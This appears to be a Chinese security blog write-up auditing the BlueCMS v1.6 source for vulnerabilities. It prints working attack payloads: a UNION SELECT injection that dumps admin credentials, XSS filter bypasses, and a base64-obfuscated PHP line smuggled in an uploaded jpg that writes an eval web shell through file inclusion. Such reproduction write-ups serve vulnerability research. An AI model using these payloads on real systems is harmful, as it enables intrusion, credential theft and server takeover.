***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ** ***本文原创作者：13324074893，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
**

##  **blueCMS介绍** ****

**终于决定要入坑“代码审计”，之前也陆陆续续试着做一些，但总是浅尝而止，并没有坚持下来。作为一个菜鸟，在之前也看了许多大牛的文章，学习了一些新的思路，看着大牛简简单单就挖到了一些0day，显着特别高大上，心生羡慕的同时自己也想试着写一写，写的不好，希望大家能够包容。因为水平还不够，所以就选了一个特别小众的blueCMS。同时做总结，搞清楚漏洞原理。好，进入正文！**

blueCMS是一款小众的CMS，网上也有人发布其相关漏洞。目前先分析那些文章提到的漏洞，进行漏洞的复现。增长一下经验，也不奢求能发现什么高质量的漏洞，只要能在大牛的基础上发现新的漏洞，就已经满足了。接下来对已公布的漏洞进行分析：一个是位于根目录下的ad_js.php文件中，存在sql注入。

##  **环境准备**

> BlueCMS v1.6
>
> Phpstudy（可快速搭建环境） php5.2+apache+mysql
>
> 操作系统 WIN7 64位

##  **sql注入** **问题1：** ****

首先查看配置文件，发现网站有统一的过滤方法，在文件common.inc.php中，对$_post、$_get、$_cookies和$_request统一进行gpc处理。代码如下：

    
    
     if(!get_magic_quotes_gpc())
    
    {
    
    	$_POST = deep_addslashes($_POST);
    
    	$_GET = deep_addslashes($_GET);
    
    	$_COOKIES = deep_addslashes($_COOKIES);
    
    	$_REQUEST = deep_addslashes($_REQUEST);
    
    }

产生漏洞的文件ad_js.php，代码中直接对变量$ad_id进行拼接，没有使用单引号，所以我们可以绕过魔术引号的转译。

![图片.png](https://image.3001.net/images/20190220/1550634065_5c6ccc51a6efa.png!small)

追踪函数getone()，代码在mysql.class.php中，直接执行了sql语句。

![图片.png](https://image.3001.net/images/20190220/1550634079_5c6ccc5f2c88f.png!small)

漏洞复现，脚本poc直接爬取用户名和密码：<http://172.16.69.2/bluecms/ad_js.php?ad_id=1> UNION
SELECT 1,2,3,4,5,6, **GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin**

![图片.png](https://image.3001.net/images/20190220/1550634091_5c6ccc6b2190e.png!small)

##  **sql注入** **问题2：** ****

配置文件中对$_post、$_get、$_cookies和$_request统一进行gpc处理，但是遗漏了$_SERVER。而且网站恰恰通过该变量获取ip地址，因此我们就可以对ip通过client-ip或x-forwarded-for等进行伪造。代码如下：

    
    
     function getip()
    
    {
    
    	if (getenv('HTTP_CLIENT_IP'))
    
    	{
    
    		$ip = getenv('HTTP_CLIENT_IP'); 
    
    	}
    
    	elseif (getenv('HTTP_X_FORWARDED_FOR')) 
    
    	{ 
    
    		$ip = getenv('HTTP_X_FORWARDED_FOR');
    
    	}
    
    	elseif (getenv('HTTP_X_FORWARDED')) 
    
    	{ 
    
    		$ip = getenv('HTTP_X_FORWARDED');
    
    	}
    
    	elseif (getenv('HTTP_FORWARDED_FOR'))
    
    	{
    
    		$ip = getenv('HTTP_FORWARDED_FOR'); 
    
    	}
    
    	elseif (getenv('HTTP_FORWARDED'))
    
    	{
    
    		$ip = getenv('HTTP_FORWARDED');
    
    	}
    
    	else
    
    	{ 
    
    		$ip = $_SERVER['REMOTE_ADDR'];
    
    	}
    
    	return $ip;
    
    }

所以我们接下来的思路，对getip进行全文搜索，查到文件comment.php，点击进去，进行追踪。

![图片.png](https://image.3001.net/images/20190220/1550634104_5c6ccc7868492.png!small)

进入到文件comment.php中，我们发现网站还是做了安全处理的，如对comment内容做了html转译，所以xss不存在了，其它的参数进行gpc转译和字符的intval强制转换，基本上避免了sql漏洞；而且我们还可以确定漏洞触发的地点，在评论处：

![图片.png](https://image.3001.net/images/20190220/1550634111_5c6ccc7f9eb8b.png!small)

漏洞复现：

![图片.png](https://image.3001.net/images/20190220/1550634121_5c6ccc89221e6.png!small)

 **重定向漏洞** ****

参数$from可控，紧紧使用base64进行加密，漏洞位置，在登录的时候触发，不过问题不严重。

![图片.png](https://image.3001.net/images/20190220/1550634128_5c6ccc90957c5.png!small)

![图片.png](https://image.3001.net/images/20190220/1550634133_5c6ccc9592fa5.png!small)

漏洞实现

![图片.png](https://image.3001.net/images/20190220/1550634139_5c6ccc9bb2078.png!small)

##  **Xss漏洞** ****

Xss漏洞点1：

在文件user.php中，我们可以看到编辑个人资料的地方，存在存储型xss漏洞，因为只有$address进行了html转译处理，但是其它的变量进行的长度的限制。测试了一下，只有在变量$email和$msn处导致xss漏洞。

    
    
     //编辑个人资料
    
    elseif($act == 'edit_user_info'){
    
    	 $user_id = intval($_SESSION['user_id']);
    
    	 if(empty($user_id)){
    
    		 return false;
    
    	 }
    
    	$birthday = trim($_POST['birthday']);
    
    	$sex = intval($_POST['sex']);
    
        $email = !empty($_POST['email']) ? trim($_POST['email']) : '';
    
        $msn = !empty($_POST['msn']) ? trim($_POST['msn']) : '';
    
        $qq = !empty($_POST['qq']) ? trim($_POST['qq']) : '';
    
        $mobile_phone = !empty($_POST['mobile_phone']) ? trim($_POST['mobile_phone']) : '';
    
        $office_phone = !empty($_POST['office_phone']) ? trim($_POST['office_phone']) : '';
    
        $home_phone   = !empty($_POST['home_phone']) ? trim($_POST['home_phone']) : '';
    
    	$address = !empty($_POST['address']) ? htmlspecialchars($_POST['address']) : '';

如变量qq、mobile_phone等，长度限制为20，所以不能触发xss了。

![图片.png](https://image.3001.net/images/20190220/1550634149_5c6ccca5e3bd2.png!small)

漏洞复现：

参数$email；弹窗成功

![图片.png](https://image.3001.net/images/20190220/1550634158_5c6cccae488fa.png!small)

按下F12，查看页面打码

![图片.png](https://image.3001.net/images/20190220/1550634166_5c6cccb602855.png!small)

Xss漏洞点2：

在文件user.php中，我们可以看到添加新闻的地方，存在存储型xss漏洞，因为只有$descript和$content没有进行html转译处理。

    
    
        elseif ($act == 'do_add_news') {
    
     	include_once 'include/upload.class.php';
    
     	$image = new upload();
    
     	$title = !empty($_POST['title']) ? htmlspecialchars(trim($_POST['title'])) : '';
    
     	$color = !empty($_POST['color']) ? htmlspecialchars(trim($_POST['color'])) : '';
    
     	$cid = !empty($_POST['cid']) ? intval($_POST['cid']) : '';
    
     	if(empty($cid)){
    
     		showmsg('新闻分类不能为空');
    
     	}
    
     	$author = !empty($_POST['author']) ? htmlspecialchars(trim($_POST['author'])) : $_SESSION['admin_name'];
    
     	$source = !empty($_POST['source']) ? htmlspecialchars(trim($_POST['source'])) : '';
    
    	$content = !empty($_POST['content']) ? filter_data($_POST['content']) : '';
    
    	$descript = !empty($_POST['descript']) ? mb_substr($_POST['descript'], 0, 90) : mb_substr(html2text($_POST['content']),0, 90);

继续跟踪函数filter_data，代码如下：

    
    
    function filter_data($str)
    
    {
    
    	$str = preg_replace("/<(\/?)(script|i?frame|meta|link)(\s*)[^<]*>/", "", $str);
    
    	return $str;
    
    }

我们很容易进行绕过，如利用<img src=1 onerror=alert(1)>或者大小写绕过，<scir<script>pt>重写绕过。

![图片.png](https://image.3001.net/images/20190220/1550634178_5c6cccc2e9e47.png!small)

![图片.png](https://image.3001.net/images/20190220/1550637179_5c6cd87b7526a.png!small)![图片.png](https://image.3001.net/images/20190220/1550637184_5c6cd88006ea7.png!small)
![图片.png](https://image.3001.net/images/20190220/1550634189_5c6ccccdcc806.png!small)

跟踪变量$descript，追踪函数mb_sub，代码如下，只是对字数做了限制，因此可以直接写入脚本<script>alert(/xss/)</script>：

    
    
    function mb_sub($str, $sta=0, $len)
    
    {
    
     	if(strlen($str)<$len*2)
    
    		return $str;
    
    	$str=mb_substr($str, $sta, $len, gb2312);
    
    	return $str;
    
    }

漏洞展示：

![图片.png](https://image.3001.net/images/20190220/1550637197_5c6cd88d7d216.png!small)

##  **本地文件包含拿shell** ****

经过不断努力，终于发现了一处文件包含漏洞，不说那么多废话了，直接上代码，代码在文件user.php中：

    
    
     elseif ($act == 'pay'){
    
     	include 'data/pay.cache.php';
    
     	$price = $_POST['price'];
    
     	$id = $_POST['id'];
    
     	$name = $_POST['name'];
    
     	if (empty($_POST['pay'])) {
    
     		showmsg('对不起，您没有选择支付方式');
    
     	}
    
     	include 'include/payment/'.$_POST['pay']."/index.php";
    
     
    
     }

分析代码，我们发现$_POST['pay']并没有做多余的安全检测，直接进行拼接，所以我们的重点是考虑如何截断。但是这里面有一点坑。首先前文中说道，完整对post方法进行了重写，会对%00进行转译，所以利用%00进行截断是不行的。

![图片.png](https://image.3001.net/images/20190220/1550637210_5c6cd89a41b80.png!small)

所以我们要考虑利用文件路径长度截断，如用字符.或者/.或者./来截断。系统文件路径长度限制：

> Windows 259个字节
>
> Linux 4096个字节

![图片.png](https://image.3001.net/images/20190220/1550637221_5c6cd8a55ed8e.png!small)

我们知道，利用文件包含漏洞可以包含jpg文件，而且服务器可以解析jpg文件。所以我们的思路：上传一个带木马的jpg文件，利用文件包含漏洞包含jpg文件，拿shell。

在个人资料编辑出，可以上传jpg文件；我们上传一个图片马，因为该漏洞参数传递是post方式，所以无法利用菜刀，所以上传了一个大马devilzShell.jpg：

![图片.png](https://image.3001.net/images/20190220/1550637231_5c6cd8af053b4.png!small)

包含该文件：

![图片.png](https://image.3001.net/images/20190220/1550637239_5c6cd8b7c7a3c.png!small)

由于网站的文件，在大马里直接执行command发现有限制，执行失败：

![图片.png](https://image.3001.net/images/20190220/1550637248_5c6cd8c06170d.png!small)

所以，转变一下思路；上传一个jpg脚本，直接在服务器中，写入一个小马，payload如下：

    
    
    <?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>

执行该脚本，会在根目录生成一个lost.php的下马，内容<?php @eval($_POST['lostwolf']);?>

上传文件：

![图片.png](https://image.3001.net/images/20190220/1550637258_5c6cd8caa45bc.png!small)

包含文件data/upload/face_pic/15506333400.jpg；发现在服务器根目录中生成了lost.php文件

![图片.png](https://image.3001.net/images/20190220/1550637266_5c6cd8d209db7.png!small)

![图片.png](https://image.3001.net/images/20190220/1550637273_5c6cd8d9678e3.png!small)

直接上菜刀：

![图片.png](https://image.3001.net/images/20190220/1550637281_5c6cd8e1492cd.png!small)

拿shell成功：

![图片.png](https://image.3001.net/images/20190220/1550637288_5c6cd8e875afa.png!small)

##  **总结：** ****

作为一个代码审计的新手，
能在大神的基础上发现一点点新的漏洞，内心的喜悦是难以言表的。对于大神来说，可能这些还很浅薄，不过以后会努力的。写的不好，需要大牛们能都对新手有点包容，争取把能力提升上去。与君共勉！

 ***本文原创作者：13324074893，本文属FreeBuf原创奖励计划，未经许可禁止转载**

